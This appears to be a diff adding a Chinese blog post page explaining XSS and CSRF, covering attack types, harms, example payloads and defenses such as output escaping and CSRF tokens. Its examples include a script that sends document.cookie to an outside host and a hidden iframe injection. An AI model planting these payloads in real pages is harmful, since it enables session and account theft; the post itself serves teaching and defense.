@@ -1,0 +1,632 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Network security," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="简述XSS原理并举例说明">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于XSS（跨站脚本攻击）和CSRF（跨站请求伪造）">
+<meta property="og:url" content="http://yoursite.com/2016/10/12/关于XSS和CSRF/index.html">
+<meta property="og:site_name" content="Dora's Home">
+<meta property="og:description" content="简述XSS原理并举例说明">
+<meta property="og:updated_time" content="2016-09-08T08:40:46.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于XSS（跨站脚本攻击）和CSRF（跨站请求伪造）">
+<meta name="twitter:description" content="简述XSS原理并举例说明">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/10/12/关于XSS和CSRF/"/>
+
+  <title> 关于XSS（跨站脚本攻击）和CSRF（跨站请求伪造） | Dora's Home </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Dora's Home</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">记录我的技术成长之路</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-folder-open"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-reorder"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
+            
+            书单
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-project">
+          <a href="/project" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tasks"></i> <br />
+            
+            项目
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            链接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about me">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                关于XSS（跨站脚本攻击）和CSRF（跨站请求伪造）
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-10-12T12:31:22+08:00" content="2016-10-12">
+              2016-10-12
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简述XSS原理并举例说明</p>
+<a id="more"></a>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS(Cross-site scripting)，跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript)，当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站，携带木马等。</p>
+<h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>恶意web用户将代码植入到提供给其它用户使用的页面中，如果程序没有经过过滤或者过滤敏感字符不严密就直接输出或者写入数据库。合法用户在访问这些页面的时候，程序将数据库里面的信息输出，这些恶意代码就会被执行。</p>
+<h1 id="XSS漏洞的分类"><a href="#XSS漏洞的分类" class="headerlink" title="XSS漏洞的分类"></a>XSS漏洞的分类</h1><p>1.本地利用漏洞，这种漏洞存在于页面中客户端脚本自身；<br>2.反射式漏洞，这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中；<br>3.存储式漏洞，该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。</p>
+<h1 id="XSS攻击的危害"><a href="#XSS攻击的危害" class="headerlink" title="XSS攻击的危害"></a>XSS攻击的危害</h1><p>1.盗取用户cookie；<br>2.盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号；<br>3.控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力；<br>4.盗窃企业重要的具有商业价值的资料；<br>5.强制发送电子邮件；<br>6.网站挂马；</p>
+<h1 id="XSS攻击举例"><a href="#XSS攻击举例" class="headerlink" title="XSS攻击举例"></a>XSS攻击举例</h1><h2 id="例子1——最简单的脚本插入（存储式跨站漏洞）"><a href="#例子1——最简单的脚本插入（存储式跨站漏洞）" class="headerlink" title="例子1——最简单的脚本插入（存储式跨站漏洞）"></a>例子1——最简单的脚本插入（存储式跨站漏洞）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;p&gt;&lt;script&gt;alert(&quot;OK&quot;)&lt;/script&gt;&lt;/p&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<h2 id="例子2——插入恶意网站（存储式跨站漏洞）"><a href="#例子2——插入恶意网站（存储式跨站漏洞）" class="headerlink" title="例子2——插入恶意网站（存储式跨站漏洞）"></a>例子2——插入恶意网站（存储式跨站漏洞）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://www.baidu.com&quot; width=&quot;0&quot; height=&quot;0&quot; &gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
+<h2 id="例子3——窃取用户cookie（存储式跨站漏洞）"><a href="#例子3——窃取用户cookie（存储式跨站漏洞）" class="headerlink" title="例子3——窃取用户cookie（存储式跨站漏洞）"></a>例子3——窃取用户cookie（存储式跨站漏洞）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;document.write(&quot;&lt;iframe width=0 height=0 src=&apos;http://10.1.1.78/cookie.asp?cookie=&quot;+document.cookie+&quot;&apos;&gt;&lt;/iframe&gt;&quot;);&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>虽然浏览器默认禁止了跨域访问，但并不禁止在页面中引用其他域的JS文件，并可以自由执行引入的JS文件中的function（包括操作cookie、Dom等等）。根据这一点，可以方便地通过创建script节点的方法来实现完全跨域的通信。</p>
+<h2 id="例子4——窃取用户cookie（基于网页DOM结构的攻击）"><a href="#例子4——窃取用户cookie（基于网页DOM结构的攻击）" class="headerlink" title="例子4——窃取用户cookie（基于网页DOM结构的攻击）"></a>例子4——窃取用户cookie（基于网页DOM结构的攻击）</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"t"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"s"</span> <span class="attr">value</span>=<span class="string">"write"</span> <span class="attr">onclick</span>=<span class="string">test()</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</div><div class="line"><span class="keyword">var</span> str=<span class="built_in">document</span>.getElementById(<span class="string">"text"</span>).value;</div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"t"</span>).innerHTML=<span class="string">"&lt;a href='"</span>+str+<span class="string">"''&gt;test&lt;/a&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
+<h1 id="XSS防范——转义"><a href="#XSS防范——转义" class="headerlink" title="XSS防范——转义"></a>XSS防范——转义</h1><p>用户输入总是不可信任的</p>
+<ul>
+<li>对用户的输入信息转义，JS转义一般用于显示用户输入的时候</li>
+<li>当动态生成的链接地址需要赋值给href或者src属性时，需要对这些地址进行URL转义。当然，如果服务端支持在URL中包含UTF-8的字符的话，其实不转义也不会错，这就是为什么我们平时不会太注意对表单和URL参数进行转义的原因，因为服务端表现良好。</li>
+<li>似乎很多 Web 开发框架、模版引擎的开发者也发现了这一点，Django 内置模版和 Jinja2 模版总是默认转义输出变量的。如果使用了某款模版引擎，那么其必自带了方便快捷的转义方式。</li>
+<li>在既要允许用户输入HTML，又要过滤其脚本的情况下，可以使用 Tidy 等 HTML 清理库，但要小心使用。对于复杂情况，可以使用简单方法处理——白名单重新整理</li>
+</ul>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF(Cross-site request forgery)，跨站请求伪造，是一种对网站的恶意利用，CSRF比XSS更具危险性。想要深入理解CSRF的攻击特性我们有必要了解一下网站session的工作原理。</p>
+<h1 id="防范——过滤请求的处理者"><a href="#防范——过滤请求的处理者" class="headerlink" title="防范——过滤请求的处理者"></a>防范——过滤请求的处理者</h1><p>1、改良API设计，对于发布这一类创建资源的操作只接受POST请求，而GET请求应该只浏览而不改变服务器端资源。<br>2、请求令牌，首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。<br>使用请求令牌注意：</p>
+<ul>
+<li>虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。</li>
+<li>在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。</li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Network-security/" rel="tag">#Network security</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/12/常用指令/" rel="next" title="常用指令">
+                <i class="fa fa-chevron-left"></i> 常用指令
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/10/12/名词解释/" rel="prev" title="名词解释">
+                名词解释 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/头像.jpg"
+               alt="litong" />
+          <p class="site-author-name" itemprop="name">litong</p>
+          <p class="site-description motion-element" itemprop="description">写写笔记，聊聊天</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">36</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS"><span class="nav-number">1.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工作原理"><span class="nav-number">2.</span> <span class="nav-text">工作原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS漏洞的分类"><span class="nav-number">3.</span> <span class="nav-text">XSS漏洞的分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS攻击的危害"><span class="nav-number">4.</span> <span class="nav-text">XSS攻击的危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS攻击举例"><span class="nav-number">5.</span> <span class="nav-text">XSS攻击举例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#例子1——最简单的脚本插入（存储式跨站漏洞）"><span class="nav-number">5.1.</span> <span class="nav-text">例子1——最简单的脚本插入（存储式跨站漏洞）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例子2——插入恶意网站（存储式跨站漏洞）"><span class="nav-number">5.2.</span> <span class="nav-text">例子2——插入恶意网站（存储式跨站漏洞）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例子3——窃取用户cookie（存储式跨站漏洞）"><span class="nav-number">5.3.</span> <span class="nav-text">例子3——窃取用户cookie（存储式跨站漏洞）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例子4——窃取用户cookie（基于网页DOM结构的攻击）"><span class="nav-number">5.4.</span> <span class="nav-text">例子4——窃取用户cookie（基于网页DOM结构的攻击）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS防范——转义"><span class="nav-number">6.</span> <span class="nav-text">XSS防范——转义</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF"><span class="nav-number">7.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防范——过滤请求的处理者"><span class="nav-number">8.</span> <span class="nav-text">防范——过滤请求的处理者</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">litong</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
